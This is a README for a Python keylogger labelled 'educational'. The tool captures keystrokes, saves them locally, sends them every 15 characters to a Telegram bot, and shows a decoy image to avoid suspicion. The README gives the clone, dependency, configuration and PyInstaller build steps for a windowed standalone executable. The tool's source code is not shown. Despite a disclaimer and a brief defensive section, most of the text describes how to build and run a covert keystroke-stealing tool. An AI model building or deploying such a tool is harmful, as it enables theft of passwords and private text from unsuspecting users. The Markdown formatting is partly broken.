# Educational Keylogger with Telegram Integration

> **Disclaimer**: This project is for educational and research purposes only. Always obtain explicit permission before testing on any system. Unauthorized use is illegal and unethical.

## üìñ Overview

A Python-based keylogger demonstration that captures keystrokes and sends them to a Telegram bot. This project is designed for educational purposes to help cybersecurity students and professionals understand how keyloggers work, how to detect them, and how to defend against them.

## ‚ö†Ô∏è Legal and Ethical Notice

**IMPORTANT**: This software is intended for:
- Educational purposes only
- Security research with proper authorization
- Learning about cybersecurity threats and defenses

**Never use this tool on any system without explicit permission from the owner.** Unauthorized use may violate local, state, and federal laws.

## üöÄ Features

- **Keystroke Logging**: Captures keyboard input in real-time
- **Telegram Integration**: Sends captured data to a Telegram bot
- **Local Storage**: Saves keystrokes to a local file
- **Stealth Operation**: Uses steganography to appear as a harmless image
- **Cross-Platform**: Works on Windows, macOS, and Linux
- **Educational Focus**: Includes detailed comments for learning

## üì¶ Installation

### Prerequisites

- Python 3.6+
- Telegram account and bot (see setup instructions below)

### Step 1: Clone the Repository

```bash
git clone https://github.com/Melvin123-dot/Cybersecurity_Projects/Reconnaissance_and_Pentesting
cd Executable_Keylogger_Demonstration

### Step 2: Install Dependencies

pip install pynput requests pillow

### Step 3: Set Up Telegram Bot
Create a new bot with BotFather on Telegram

Save your bot token

Send a message to your new bot

Run the setup script to get your chat ID:

python setup.py

Step 4: Configuration
Edit the configuration section in the script setup.py:

python
# Telegram configuration
bot_token = "{YOUR_TELEGRAM_CHATBOT_ID}"

üõ†Ô∏è Usage
Basic Execution

bash
python Skull_Image_1.py

Creating a Standalone Executable
bash
python -m pip install pyinstaller

python -m PyInstaller --onefile --windowed --icon=hacker.ico Skull_Image_1.py

üîß How It Works
Key Components
Keylogger Module: Uses pynput to capture keyboard events

Telegram API Integration: Sends data to your Telegram bot via HTTP requests

Steganography: Displays a harmless image to avoid suspicion

Local Storage: Maintains a backup log file locally

Data Flow
Keystrokes are captured by the keylogger

Data is saved to a local file (keystrokes.txt)

Every 15 characters, data is sent to the Telegram bot

A decoy image is displayed to maintain appearance of legitimacy

üõ°Ô∏è Defensive Measures
This project also serves to educate about defense against keyloggers:

Detection: Monitor for unusual processes and network activity

Prevention: Use anti-keylogger software and keep systems updated

Awareness: Be cautious of unknown applications and email attachments
